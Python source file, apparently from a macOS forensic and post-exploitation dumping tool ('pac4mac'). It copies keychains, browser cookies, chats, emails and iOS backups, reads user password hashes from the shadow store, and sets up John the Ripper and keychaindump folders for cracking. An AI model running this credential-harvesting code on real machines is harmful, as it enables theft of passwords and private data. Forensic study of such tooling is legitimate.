#! /usr/bin/python
# -*- coding: iso-8859-15 -*-


import sys, os
import time
import os.path
import re
import commands
import sqlite3 as lite
import time,datetime
import shutil


############################################
#[Variables Initialization]
############################################

#MacOS_version
var_version = sys.argv[1]

#privileges dump
var_privileges_dump = sys.argv[2]

#current user
var_home = os.getlogin()
var_uid = os.geteuid()

#directory for results
var_datestart = time.strftime('%y%m%d-%Hh%M%S',time.localtime())

root_dir_results = 'results/'
dir_results = root_dir_results + str(var_datestart)

#file identity
file_identity_dest = dir_results + '/#macosx_identity.txt'

#file version osx
file_version_dest = dir_results + '/#macosx_version.txt'

#file log pac4mac 
file_history_dest = dir_results + '/#log_pac4mac.txt'

#directory for database
dir_db = 'db/'
db_search_identity = dir_db + 'z_identity.input'
db_search_admin = dir_db + 'z_admin.input'
db_search_authentication = dir_db + 'authentication.db'
db_search_keychain = dir_db + 'keychain.db'
db_search_calendar = dir_db + 'calendar.db'
db_search_skype = dir_db + 'skype.db'
db_search_chat = dir_db + 'chat.db'
db_search_browser_hist = dir_db + 'browser_hist.db'
db_search_browser_cookies = dir_db + 'browser_cookies.db'
db_search_browser_download = dir_db + 'browser_download.db'
db_keywords_pass = dir_db + 'z_keywords_pass.input'
db_search_log = dir_db + 'logs.db'
db_search_appli = dir_db + 'applications.db'
db_search_persist = dir_db + 'persistence.db'
db_search_trojans = dir_db + 'trojans.db'
db_search_artifact_user = dir_db + 'artifact_user.db'
db_search_del_recover = dir_db + 'del_recover.db'
db_search_hiberswap = dir_db + 'swap_hiber.db'
db_search_email = dir_db + 'z_email.input'
db_search_ios_devices = dir_db + 'iOS_devices.db'
db_search_ios_db = dir_db + 'iOS_db.db'
db_search_print = dir_db + 'printers.db'
db_search_spotlight = dir_db + 'spotlight.db'
db_search_email_spot = dir_db + 'email_spotlight.db'
db_search_email_spot_sl = dir_db + 'email_spotlight_snow.db'

db_search_contact = dir_db + 'contact.db'
db_search_history_net_sys = dir_db + 'history_net_sys.db'
db_search_stickies = dir_db + 'stickies.db'
db_search_system_build = dir_db + 'system_build.db'

#userfile files
dir_users_info = dir_results + '/#users_info/'
file_current_user = dir_users_info + 'user_current.txt'
file_userslist = dir_users_info + 'users_list.txt'
file_usersadmin = dir_users_info + 'users_admin.txt'
file_allusershashes = dir_users_info + 'users_hashes.txt'
file_crackedhashes = dir_users_info + 'users_passwords.txt'
file_useradded = dir_users_info + 'user_added.txt'

#dir anfd files keychain
file_log_keychain = dir_results + '/keychain_dump.txt'
dir_dump_keychain = dir_results + '/keychain_dump/'

file_keychain_current = dir_dump_keychain + 'keychain_current.keychain'
file_current_keychain_decrypted = dir_dump_keychain + 'keychain_current_decrypted.txt'
file_current_keychain_pass = dir_dump_keychain + 'passwords_current_keychain.txt'
file_current_keychain_juuso = dir_dump_keychain + 'keychain_current_juuso.txt'
file_current_keychain_juuso_pass = dir_dump_keychain + 'passwords_current_by_juuso.txt'

size_pass_keychain = 25

#authentication files
file_log_authentication = dir_results + '/authentication_dump.txt'
dir_dump_authentication = dir_results + '/authentication_dump/'

#log files
file_log_log = dir_results + '/log_dump.txt'
dir_dump_log = dir_results + '/log_dump/'

#appli files
file_log_appli = dir_results + '/appli_dump.txt'
dir_dump_appli = dir_results + '/appli_dump/'

#persistence files
file_log_persist = dir_results + '/persistence_dump.txt'
dir_dump_persist = dir_results + '/persistence_dump/'

#trojans files
file_log_trojans = dir_results + '/trojans_dump.txt'
dir_dump_trojans = dir_results + '/trojans_dump/'

#user files
file_log_artifact_user = dir_results + '/artifact_user_dump.txt'
dir_dump_artifact_user = dir_results + '/artifact_user_dump/'

#deleted files and recovered files
file_log_del_recover = dir_results + '/del_recover_dump.txt'
dir_dump_del_recover = dir_results + '/del_recover_dump/'

#swap and hibernation files
file_log_hiberswap = dir_results + '/hiber-swap_dump.txt'
dir_dump_hiberswap = dir_results + '/hiber-swap_dump/'

#print files
file_log_print = dir_results + '/print_dump.txt'
dir_dump_print = dir_results + '/print_dump/'

#spotlight files
file_log_spotlight = dir_results + '/spotlight_dump.txt'
dir_dump_spotlight = dir_results + '/spotlight_dump/'

#dir skype dump (skype)
file_log_skype = dir_results + '/skype_dump.txt'
dir_dump_skype = dir_results + '/skype_dump/'

# dir ichat, messages, adium dump
file_log_chat = dir_results + '/chat_dump.txt'
dir_dump_chat = dir_results + '/chat_dump/'


# ios files
file_log_ios = dir_results + '/iOS_dump.txt'
dir_dump_ios = dir_results + '/iOS_dump/'

#password files
dir_passwords = dir_results + '/passwords_database'
file_password_database = dir_passwords + '/ALL-passwords_1.txt'

# browser files 
file_log_browser = dir_results + '/browser_dump.txt'
dir_browser_dump = dir_results + '/browser_dump/'

#calendar output
file_log_calendar = dir_results + '/calendar_dump.txt'
dir_dump_calendar = dir_results + '/calendar_dump/'

# Email files
file_log_email = dir_results + '/email_dump.txt'
dir_dump_email = dir_results + '/email_dump/'

# Email files spotlight
file_log_email_spot = dir_results + '/email_dump_spot.txt'
dir_dump_email_spot = dir_results + '/email_dump_spot/'

# Address Book files
file_log_contact = dir_results + '/contact_dump.txt'
dir_dump_contact = dir_results + '/contact_dump/'

# miscellaneous system history and network
file_log_history_net_sys = dir_results + '/history_net_sys_dump.txt'
dir_dump_history_net_sys = dir_results + '/history_net_sys_dump/'

# Stickies files
file_log_stickies = dir_results + '/stickies_dump.txt'
dir_dump_stickies = dir_results + '/stickies_dump/'

# Information about Mac installation
file_log_system_build = dir_results + '/system_build_dump.txt'
dir_dump_system_build = dir_results + '/system_build_dump/'


#john the ripper
dir_path_jtr = 'tools/jtr/magnum-jumbo/run/'
#dir_path_jtr =' tools/jtr/JTR-1.7.9-jumbo5-OSX-Universal/'



file_wordlist_for_jtr = dir_db + 'z_mypasswords.input'
time_sec_to_jtr = ' 10'

#juuso
dir_path_juuso = 'tools/juuso-keychaindump/'



############################################
#[Functions]
############################################

def print_red(text):
	print ('\033[22;31m' + text + '\033[0;m')

def print_red_bold(text):
	print ('\033[1;31m' + text + '\033[0;m')
		
def print_in(text):
	print ('\033[0;34m' + text + '\033[1;m')

def print_green(text):
	print ('\033[22;32m' + text + '\033[0;m')

def print_log(text):
	print ('\033[0;38m' + text + '\033[1;m')

def print_green_bold(text):
	print ('\033[1;32m' + text + '\033[0;m')


#[create file]
############################################
def fct_writefile(var_x, file_x):
	file_x = file_x.replace("\ "," ")
	file = open(file_x,'a')
	file.write(var_x)
	file.close()
	
def fct_writefile_del(var_x, file_x):
	file_x = file_x.replace("\ "," ")
	file = open(file_x,'w')
	file.write(var_x)
	file.close()
############################################

#[load opendirectoryd] (dscl)
############################################
def fct_load_opendirectoryd():
	if var_version == "10":
		os.system('dscl .')
	os.system('launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist')
############################################


#add to password database
############################################
def fct_add_pass_database(passwords):
	fct_writefile(passwords, file_password_database)
############################################



###################################################################################################################################
										     #[MAIN DUMP FUNCTION]
###################################################################################################################################
def fct_dump_main(db_search,dir_dest_dump,file_log):

	#Tag to indicate if file or dir is available
	ret = "0"

	if os.path.isfile(db_search):
		res = 0
		file = open(db_search,'r')
		lines_db = file.readlines()
		file.close()
			
		filtre = re.compile('^\[(.+)\]\[(.+)\](.+)',re.IGNORECASE)
		for i in range(len(lines_db)):
			res = filtre.findall(lines_db[i])
			for j in res:
				var_tag = j[0]
				var_search = j[1]
				var_cmd = j[2]

				if var_tag == "COPY_FILE_USER_PROFILE":
					ret = fct_dump_files_user_profil(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "COPY_FILE_PROFILE":
					ret = fct_dump_files_profil(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "COPY_FILE_USER":
					ret = fct_dump_files_user(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "COPY_FILE":
					ret = fct_dump_files_system(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "COPY_DIR_USER":
					ret = fct_dump_dir_user(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "COPY_DIR":
					ret = fct_dump_dir_system(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "CMD_USER":
					ret = fct_cmd_user(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "CMD":
					ret = fct_cmd(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "PLIST_USER":
					ret = fct_dump_plist_user(var_search,var_cmd,dir_dest_dump,file_log)
				elif var_tag == "PLIST":
					ret = fct_dump_plist(var_search,var_cmd,dir_dest_dump,file_log)


				else : 
					print_red_bold("\nUnknown TAG : " + var_tag + " in " + db_search + "\n")

	else:
		print_log("Database <" + db_search_ios_db + "> doesn't exist :(")


###################################################################################################################################
										     #[dump system file]
###################################################################################################################################
def fct_dump_files_system(var_search,var_path_file,path_dest_dump,file_log_dump):
	
	#tag = "COPY_FILE"

	file_available = "0"
	
	#concatenation of path, username
	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
	res = filtre.findall(var_path_file)
	for j in res:
		var_file = j[1]
		var_file_db =  j[0] + "/" + var_file
		
		#dump from mounted volume or target mode
		if var_privileges_dump == "target":
			var_file_db = path_to_HD_target + var_file_db
		
		if os.path.isfile(var_file_db):
			file_available = "1"		
			print_green("========================================================================")
			print_log("[" + var_search.upper() + "] Copy of > [" + var_file_db + "]")
			if not os.path.isdir(path_dest_dump) :
				os.makedirs(path_dest_dump)
			print_green("Copy of file, be patient ...\n...\n...")
			var_file_dest = var_search + "_" + var_file
			path_final_dest = path_dest_dump + var_file_dest
			try:
				shutil.copy(var_file_db,path_final_dest)
				log_dump = "[" + var_search.upper() + "]\nCopy of file : " + var_file_db + " to " + path_final_dest + "\n"
				fct_writefile(log_dump, file_log_dump)
				print_log("[\\" + var_search.upper() + "] Stored into " + path_final_dest)
			except IOError :
				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
				file_available = "0"
			print_green("========================================================================")

	return file_available

###################################################################################################################################
										     #[dump system directory]
###################################################################################################################################
def fct_dump_dir_system(var_search,var_path_dir,path_dest_dump,file_log_dump):
	
	#tag = "COPY_DIR"

	file_available = "0"

	if var_privileges_dump == "target":
		var_path_dir = path_to_HD_target + var_path_dir
				
	if os.path.isdir(var_path_dir):
		file_available = "1"
		print_green("========================================================================")
		print_log("[" + var_search.upper() + "] Copy of > [" + var_path_dir + "]")
		if not os.path.isdir(path_dest_dump):
			os.makedirs(path_dest_dump)

		var_dir_dest = path_dest_dump + var_search
		print_green("Copy of directory, be patient ...\n...\n...")

		try:
			shutil.copytree(var_path_dir,var_dir_dest)
			log_dump = "[" + var_search.upper() + "]\nCopy of directory : " + var_path_dir + " to " + var_dir_dest + "\n"
			fct_writefile(log_dump, file_log_dump)
			print_log("[\\" + var_search.upper() + "] Stored into " + var_dir_dest)
		except shutil.Error, exc:
			errors = exc.args[0]
			for error in errors:
				src, dst, msg = error
				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump " + src + ":(")
			file_available = "0"
		print_green("========================================================================")
							
	return file_available


###################################################################################################################################
										     #[dump user directory]
###################################################################################################################################
def fct_dump_dir_user(var_search,var_path_dir,path_dest_dump,file_log_dump):
	
	#tag = "COPY_DIR_USER"

	file_available = "0"

	#extract username list
	file = open(file_userslist,'r')
	lines_username = file.readlines()
	file.close()

	#for researches which depend of <USER>
	for k in range(len(lines_username)):
		var_path_db = var_path_dir

		lines_username[k] = lines_username[k].strip('\n')
		var_path_db = var_path_db.replace("<USER>",lines_username[k])

		#dump from mounted volume or target mode
		if var_privileges_dump == "target":
			var_path_db = path_to_HD_target + var_path_db
	
		if os.path.isdir(var_path_db):
			file_available = "1"
			print_green("========================================================================")
			print_log("[" + var_search.upper() + "] Copy of > [" + var_path_db + "]")
			if not os.path.isdir(path_dest_dump):
				os.makedirs(path_dest_dump)
			var_dir_dest = path_dest_dump + var_search

			print_green("Copy of directory, be patient ...\n...\n...")
			try:
				shutil.copytree(var_path_db,var_dir_dest)
				log_dump = "[" + var_search.upper() + "]\nCopy of directory : " + var_path_db + " to " + var_dir_dest + "\n"
				fct_writefile(log_dump, file_log_dump)
				print_log("[\\" + var_search.upper() + "] Stored into " + var_dir_dest)
			except shutil.Error, exc:
				errors = exc.args[0]
				for error in errors:
					src, dst, msg = error
					print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump " + src + ":(")
				file_available = "0"
			print_green("========================================================================")

	
	return file_available


###################################################################################################################################
										     #[dump generic user files]
###################################################################################################################################
def fct_dump_files_user(var_search,var_path_file,path_dest_dump,file_log_dump):

	#tag = "COPY_FILE_USER"
	
	file_available = "0"

	#extract username list
	file = open(file_userslist,'r')
	lines_username = file.readlines()
	file.close()
		
	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
	res = filtre.findall(var_path_file)
	
	#for each user
	for k in range(len(lines_username)):
		for j in res:
			lines_username[k]=lines_username[k].strip('\n')
			var_file = j[1].replace("<USER>",lines_username[k])
			var_file_db = j[0].replace("<USER>",lines_username[k]) + "/" + var_file

			#dump from mounted volume or target mode
			if var_privileges_dump == "target":
				var_file_db = path_to_HD_target + var_file_db

			if os.path.isfile(var_file_db):
				file_available = "1"

				print_green("========================================================================")
				print_log("[" + var_search.upper() + "] Copy of > [" + var_file_db + "]")
				if not os.path.isdir(path_dest_dump):
					os.makedirs(path_dest_dump)
				print_green("Copy of file, be patient ...\n...\n...")
				var_file_dest = var_search + "_" + lines_username[k] + "_" + var_file
				path_final_dest = path_dest_dump + var_file_dest
				try:
					shutil.copy(var_file_db,path_final_dest)
					log_dump = "[" + var_search.upper() + "]\nCopy of file : " + var_file_db + " to " + path_final_dest + "\n"
					fct_writefile(log_dump, file_log_dump)
					print_log("[\\" + var_search.upper() + "] Stored into " + path_final_dest)
				except IOError :
					print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
					file_available = "0"
				print_green("========================================================================")
	
	return file_available


###################################################################################################################################
										     #[dump generic files with profil]
###################################################################################################################################
def fct_dump_files_profil(var_search,var_path_file,path_dest_dump,file_log_dump):

	#tag = "COPY_FILE_PROFILE"
	
	file_available = "0"

	tmp_file_profil = path_dest_dump + '/.tmpfileprofil.txt'

	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
	res = filtre.findall(var_path_file)

	for j in res:
		var_file = j[1]
		var_file_db = j[0] + "/" + var_file

		#dump from mounted volume or target mode
		if var_privileges_dump == "target": 
			var_file_db = path_to_HD_target + var_file_db

		filtre_search_profil = re.compile('^(\/.+)\/<PROFILE>',re.IGNORECASE)
		res_search_profil = filtre_search_profil.findall(var_file_db)
		#for each profil
		for n in res_search_profil:
			if os.path.isdir(n):
				file_available = "1"
				var_profil = os.popen("find '" + n + "' -name " + var_file).read()
				#storage of results
				if not os.path.isdir(path_dest_dump):
					os.makedirs(path_dest_dump)
				fct_writefile_del(var_profil,tmp_file_profil)
				file_tmp_profil = open(tmp_file_profil,'r')
				lines_tmp_profil = file_tmp_profil.readlines()
				file_tmp_profil.close()
				for m in range(len(lines_tmp_profil)):
					regular_express = n + "\/(.+)\/"
					filtre_profil = re.compile(regular_express,re.IGNORECASE)
					res_profil = filtre_profil.findall(lines_tmp_profil[m])
					for p in res_profil:
						var_file_db_new = n + "/" + p + "/" + var_file
						if os.path.isfile(var_file_db_new):
							print_green("========================================================================")
							print_log("[" + var_search.upper() + "] Copy of > [" + var_file_db_new + "]")
							print_green("Copy of file, be patient ...\n...\n...")
							var_file_dest=var_search + "-" + p + "_" + var_file
							path_final_dest = path_dest_dump + var_file_dest
							try:
								shutil.copy(var_file_db_new,path_final_dest)
								log_copy = "[" + var_search.upper() + "] \nCopy of file : " + var_file_db_new + " to " + path_final_dest + "\n"
								fct_writefile(log_copy, file_log_dump)
								print_green("Profil:" + p)
								print_log("[\\" + var_search.upper() + "] Stored into " + path_final_dest)
							except IOError :
								print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
								file_available = "0"
							print_green("========================================================================")	
	
	return file_available


###################################################################################################################################
										     #[dump generic user files with profil]
###################################################################################################################################
def fct_dump_files_user_profil(var_search,var_path_file,path_dest_dump,file_log_dump):

	#tag = "COPY_FILE_USER_PROFILE"
	
	file_available = "0"

	tmp_file_profil = path_dest_dump + '/.tmpfileprofil.txt'
		
	#extract username list
	file = open(file_userslist,'r')
	lines_username = file.readlines()
	file.close()	

	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
	res = filtre.findall(var_path_file)

	#for each user
	for k in range(len(lines_username)):
		for j in res:
			lines_username[k]=lines_username[k].strip('\n')
			var_file = j[1].replace("<USER>",lines_username[k])
			var_file_db = j[0].replace("<USER>",lines_username[k]) + "/" + var_file

			#dump from mounted volume or target mode
			if var_privileges_dump == "target": 
				var_file_db = path_to_HD_target + var_file_db

			filtre_search_profil = re.compile('^(\/.+)\/<USERPROFILE>',re.IGNORECASE)
			res_search_profil = filtre_search_profil.findall(var_file_db)
			#for each profil
			for n in res_search_profil:
				if os.path.isdir(n):
					file_available = "1"
					var_profil = os.popen("find '" + n + "' -name " + var_file).read()
					#storage of results
					if not os.path.isdir(path_dest_dump):
						os.makedirs(path_dest_dump)
					fct_writefile_del(var_profil,tmp_file_profil)
					file_tmp_profil = open(tmp_file_profil,'r')
					lines_tmp_profil = file_tmp_profil.readlines()
					file_tmp_profil.close()
					for m in range(len(lines_tmp_profil)):
						regular_express = n + "\/(.+)\/"
						filtre_profil = re.compile(regular_express,re.IGNORECASE)
						res_profil = filtre_profil.findall(lines_tmp_profil[m])
						for p in res_profil:
							var_file_db_new = n + "/" + p + "/" + var_file
							if os.path.isfile(var_file_db_new):

								print_green("========================================================================")
								print_log("[" + var_search.upper() + "] Copy of > [" + var_file_db_new + "]")
								print_green("Copy of file, be patient ...\n...\n...")
								var_file_dest=var_search + "-" + p +  "-" + lines_username[k] + "_" + var_file
								path_final_dest = path_dest_dump + var_file_dest
								try:
									shutil.copy(var_file_db_new,path_final_dest)
									log_copy = "[" + var_search.upper() + "] \nCopy of file : " + var_file_db_new + " to " + path_final_dest + "\n"
									fct_writefile(log_copy, file_log_dump)
									print_green("User:" + lines_username[k] + " / " + "Profil:" + p)
									print_log("[\\" + var_search.upper() + "] Stored into " + path_final_dest)
								except IOError :
									print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
									file_available = "0"
								print_green("========================================================================")

	
	return file_available


###################################################################################################################################
										     #[launch command]
###################################################################################################################################
def fct_cmd(var_search,var_cmd,path_dest_dump,file_log_dump):
	
	#tag = CMD

	path_cmd_result = path_dest_dump + "CMD_" + file_log_dump.replace(dir_results + "/","")
	if var_privileges_dump == "target":
		if " /" not in var_cmd:
			print_log("Command is not supported : \n" + var_cmd)
			return 0
		var_cmd = var_cmd.replace(" /", " " + path_to_HD_target.replace(" ","\ ") + "/")

	print_green("========================================================================")
	print_log("[" + var_search.upper() + "] Launching of the following command > \n[" + var_cmd+ "]")
	print_green("Launching of the command, be patient ...\n...\n...")
	res_cmd = commands.getoutput(var_cmd).strip('\n')
	res_cmd = "[" + var_search.upper() + "]\n" + "[" + var_cmd + "]\n[RES]\n" + res_cmd + "\n[\RES]\n\n"
	log_copy = "[" + var_search.upper() + "] \nLaunched Command : " + var_cmd + " and results are into: " + path_cmd_result + "\n"

	#storage of results
	if not os.path.isdir(path_dest_dump):
		os.makedirs(path_dest_dump)
	fct_writefile(res_cmd, path_cmd_result)
	fct_writefile(log_copy, file_log_dump)
	print_log("[\\" + var_search.upper() + "] Stored into " + path_cmd_result)
	print_green("========================================================================")


###################################################################################################################################
										     #[launch command with username parameter]
###################################################################################################################################
def fct_cmd_user(var_search,var_cmd,path_dest_dump,file_log_dump):
	
	#tag = CMD_USER

	path_cmd_result = path_dest_dump + "CMD_" + file_log_dump.replace(dir_results + "/","")

	#extract username list
	file = open(file_userslist,'r')
	lines_username = file.readlines()
	file.close()	


	#for researches which depend of <USER>
	for k in range(len(lines_username)):
		lines_username[k] = lines_username[k].strip('\n')
		var_cmd_user = var_cmd.replace("<USER>",lines_username[k])


		if var_privileges_dump == "target":
			if " /" not in var_cmd_user:
				print_log("Command is not supported : \n" + var_cmd_user)
				return 0
			var_cmd_user = var_cmd_user.replace(" /", " " + path_to_HD_target.replace(" ","\ ") + "/")

		print_green("========================================================================")
		print_log("[" + var_search.upper() + "] Launching of the following command > \n[" + var_cmd_user+ "]")
		print_green("Launching of the command, be patient ...\n...\n...")
		res_cmd = commands.getoutput(var_cmd_user).strip('\n')
		res_cmd = "[" + var_search.upper() + "]\n" + "[" + var_cmd_user + "]\n[RES]\n" + res_cmd + "\n[\RES]\n\n"
		log_copy = "[" + var_search.upper() + "] \nLaunched Command : " + var_cmd_user + " and results are into: " + path_cmd_result + "\n"

		#storage of results
		if not os.path.isdir(path_dest_dump):
			os.makedirs(path_dest_dump)
		fct_writefile(res_cmd, path_cmd_result)
		fct_writefile(log_copy, file_log_dump)
		print_log("[\\" + var_search.upper() + "] Stored into " + path_cmd_result)
		print_green("========================================================================")


###################################################################################################################################
										     #[dump generic PLIST file]
###################################################################################################################################
def fct_dump_plist(var_search,var_path_file,path_dest_dump,file_log_dump):
	
	#tag = "PLIST"

	file_available = "0"
	
	#concatenation of path, username
	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
	res = filtre.findall(var_path_file)
	for j in res:
		var_file = j[1]
		var_file_db =  j[0] + "/" + var_file
		
		#dump from mounted volume or target mode
		if var_privileges_dump == "target":
			var_file_db = path_to_HD_target + var_file_db
		
		if os.path.isfile(var_file_db):
			file_available = "1"
			#dump from mounted volume or target mode
			var_file_db = var_file_db.replace(" ","\ ")
			
			print_green("========================================================================")
			print_log("[" + var_search.upper() + "] Copy and conversion of > [" + var_file_db + "]")
			if not os.path.isdir(path_dest_dump) :
				os.makedirs(path_dest_dump)
			print_green("Copy of PLIST file, be patient ...\n...\n...")
			var_file_dest = var_search + "_" + var_file.replace(" ","\ ")
			path_final_dest = path_dest_dump + var_file_dest
			try:
				commands.getoutput("plutil -convert xml1 " + var_file_db + " -o " + path_final_dest)
				log_dump = "[" + var_search.upper() + "]\nCopy of PLIST file : " + var_file_db + " to " + path_final_dest + "\n"
				fct_writefile(log_dump, file_log_dump)
				print_log("[\\" + var_search.upper() + "] Stored into " + path_final_dest)
			except IOError :
				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
				file_available = "0"
			print_green("========================================================================")

	return file_available


###################################################################################################################################
										     #[dump PLIST with generic user files]
###################################################################################################################################
def fct_dump_plist_user(var_search,var_path_file,path_dest_dump,file_log_dump):

	#tag = "PLIST_USER"
	
	file_available = "0"

	#extract username list
	file = open(file_userslist,'r')
	lines_username = file.readlines()
	file.close()
		
	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
	res = filtre.findall(var_path_file)
	
	#for each user
	for k in range(len(lines_username)):
		for j in res:
			lines_username[k]=lines_username[k].strip('\n')
			var_file = j[1].replace("<USER>",lines_username[k])
			var_file_db = j[0].replace("<USER>",lines_username[k]) + "/" + var_file

			#dump from mounted volume or target mode
			if var_privileges_dump == "target":
				var_file_db = path_to_HD_target + var_file_db

			if os.path.isfile(var_file_db):
				file_available = "1"
				#dump from mounted volume or target mode
				var_file_db = var_file_db.replace(" ","\ ")

				print_green("========================================================================")
				print_log("[" + var_search.upper() + "] Copy and conversion of > [" + var_file_db + "]")
				if not os.path.isdir(path_dest_dump):
					os.makedirs(path_dest_dump)
				print_green("Copy of PLIST file, be patient ...\n...\n...")
				var_file_dest = var_search + "_" + lines_username[k] + "_" + var_file.replace(" ","\ ")
				path_final_dest = path_dest_dump + var_file_dest
				try:
					commands.getoutput("plutil -convert xml1 " + var_file_db + " -o " + path_final_dest)
					log_dump = "[" + var_search.upper() + "]\nCopy of PLIST file : " + var_file_db + " to " + path_final_dest + "\n"
					fct_writefile(log_dump, file_log_dump)
					print_log("[\\" + var_search.upper() + "] Stored into " + path_final_dest)
				except IOError :
					print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
					file_available = "0"
				print_green("========================================================================")
	
	return file_available




####################################################################################################################################
											#[dump from Mounted Volume or Target mode]
####################################################################################################################################
def fct_dump_by_target():


	var_log = str(datetime.datetime.now()) + ": " + "Full Dump" + " of Mounted Volume [" + path_to_HD_target + "]\n"
	fct_writefile(var_log, file_history_dest)

	#create of directories
	os.makedirs(dir_passwords)
	
	#dump users and groups
	fct_dump_users()

	#dump identity
	fct_identity()

	#dump information about Mac installation
	fct_dump_system_build()

	#authentication dump
	fct_authentication_dump()

	#dump miscellaneous history
	fct_dump_history_net_sys()

	#dump hashes
	#look authentication dump :)


	#dump keychain files
	fct_dump_files_user(db_search_keychain,"keychain_user",dir_dump_keychain,file_log_keychain)
	fct_dump_files_system(db_search_keychain,"keychain_system",dir_dump_keychain,file_log_keychain)

	#dump browser
	type_search = ["cookies","places","downloads"]
	for i in range(len(type_search)):
		fct_dump_secrets_browser(type_search[i])

	#dump calendar
	fct_dump_ical()

	#skype messages dump
	fct_dump_skype()

	#dump chat messages
	fct_dump_chat()

	#dump Address book
	fct_dump_contact()

	#dump stickies
	fct_dump_stickies()

	# dump printed files
	fct_dump_printed_doc()

	# dump ios db backup
	fct_dump_ios()

	#dump user conf recent
	fct_dump_artifact_user()

	#dump deleted and recovered files
	fct_dump_del_recover()

	#Spotlight dump
	fct_dump_spotlight()

	#dump installed application and updates
	fct_dump_appli()

	#dump persistence parameters
	fct_dump_persist()

	#dump trojan files
	fct_dump_trojans()

	#dump email spotlight
	fct_dump_email_spot()

	#dump email content (mbox)
	fct_dump_email()

	#dump log
	fct_dump_log()

	#dump hiberfile and swap files
	fct_dump_hiberswap()

	print_red("========================================================================\n\n")



####################################################################################################################################
											#[dump live information]
####################################################################################################################################
def fct_dump_live_change_dir():
	
	
	#dir_results has been modified :(
	db_search_sys = dir_db + 'system_live.db'
	file_log_sys = dir_results + '/system_live_dump.txt'
	dir_dump_sys = dir_results + '/system_live_dump/'
	
	dir_users_info = dir_results + '/#users_info'
	file_userslist = dir_users_info + '/users_list.txt'

	return file_userslist,db_search_sys,file_log_sys,dir_dump_sys


####################################################################################################################################
											#[dump info about identity]
####################################################################################################################################
def fct_identity():


	file = open(db_search_identity,'r')
	lines_db = file.readlines()
	file.close()

	file_identity = lines_db[0]
	for i in range(len(lines_db)):
		file_identity = lines_db[i].strip("\n")
		if "<USER>" in file_identity:
			file_identity = file_identity.replace("<USER>",var_home)
		if os.path.isfile(file_identity):
			print_red_bold("\n[] Dump MAC identity")
			print_green("========================================================================")
			print_log("[IDENTITY] About this MAC  > ")
			
			file_identity = file_identity.replace(" ","\ ")
			file = open(file_identity,'r')
			lines_id = file.readlines()
			file.close()

			tag_registration = "0"
			for index_lines_id in range(len(lines_id)):
				filtre = re.compile('<string>(.*)</string>',re.IGNORECASE)
				res = filtre.findall(lines_id[index_lines_id])
				for j in res:
					data_identity = j.strip("\"")
					if data_identity :
						print_green(data_identity)
						fct_writefile(data_identity + "\n",file_identity_dest)
						fct_add_pass_database(data_identity + "\n")
					
			print_log("[\\IDENTITY] Stored into " + file_identity_dest)
			print_green("========================================================================")

####################################################################################################################################
											#[dump users/hashes and cracking]
####################################################################################################################################
def fct_dump_users():

	#log current user
	if not os.path.isdir(dir_users_info):
		os.makedirs(dir_users_info)

	print_red_bold("\n[] Dump Usernames")	
	# users
	if var_privileges_dump == "target":
		var_userslist = ""
		for file in os.listdir(path_to_HD_target + "/Users/"):
			if file not in "Shared" and file not in ".localized" and file not in ".DS_Store":
				var_userslist = var_userslist + file + "\n"
	else:
		var_userslist=os.popen("/usr/bin/dscacheutil -q user|egrep -B 5 'bash|zsh'|grep name|cut -c '7-'").read().strip("\n")
	
	print_green("========================================================================")
	print_log("[USERS] The available users are the following > ")
	print_green(var_userslist)
	print_log("\n[\USERS] Stored into " + file_userslist)
	print_green("========================================================================")
	fct_writefile(var_userslist,file_userslist)
	fct_add_pass_database(var_userslist + "\n")
	
	#users admin
	if var_privileges_dump == "target" :
		file = open(db_search_admin,'r')
		lines_file = file.readlines()
		file.close()
		for index_admin in range(len(lines_file)):
			var_usersadmin=os.popen("defaults read " + path_to_HD_target.replace(" ","\ ") + lines_file[index_admin] + " users |grep -v root | sed '1d' | sed '$d'").read().replace(",","")
			print_green("========================================================================")
			print_log("[USERS_ADMIN] The available users of Admin group are the followings > ")
			print_green(var_usersadmin)
			print_log("\n[\USERS_ADMIN] Stored into " + file_usersadmin)
			print_green("========================================================================")
			fct_writefile(var_usersadmin,file_usersadmin)

	else : 
		var_usersadmin=os.popen("/usr/bin/dscl . -read /Groups/admin | grep 'GroupMembership:' | cut -c '18-' | sed '/root / s///'").read().strip("\n")
		print_green("========================================================================")
		print_log("[USERS_ADMIN] The available users of Admin group are the followings > ")
		print_green(var_usersadmin)
		print_log("\n[\USERS_ADMIN] Stored into " + file_usersadmin)
		print_green("========================================================================")
		fct_writefile(var_usersadmin,file_usersadmin)


def fct_dump_users_hashes() :
	
	#hashes dump
	if var_version == "10" :
		file=open(file_userslist,'r')
		lines_file = file.readlines()
		file.close()
		var_allusershashes = ""
		for i in range(len(lines_file)):
			var_usershashes = os.popen("cat /var/db/shadow/hash/$(dscl localhost -read /Search/Users/" + lines_file[i].strip("\n") + " | grep GeneratedUID | cut -c15-) | cut -c169-216").read().strip("\n")
			var_usershashes = lines_file[i].strip("\n") +":" + var_usershashes	
		var_allusershashes = var_allusershashes + var_usershashes + "\n"
		
		print_green("========================================================================")
		print_log("[USERS_HASHES] The available users hashes are the following > ")
		print_green(var_allusershashes)
		print_log("[\USERS_HASHES] Stored into " + file_allusershashes)
		print_green("========================================================================")
		fct_writefile(var_allusershashes,file_allusershashes)
	
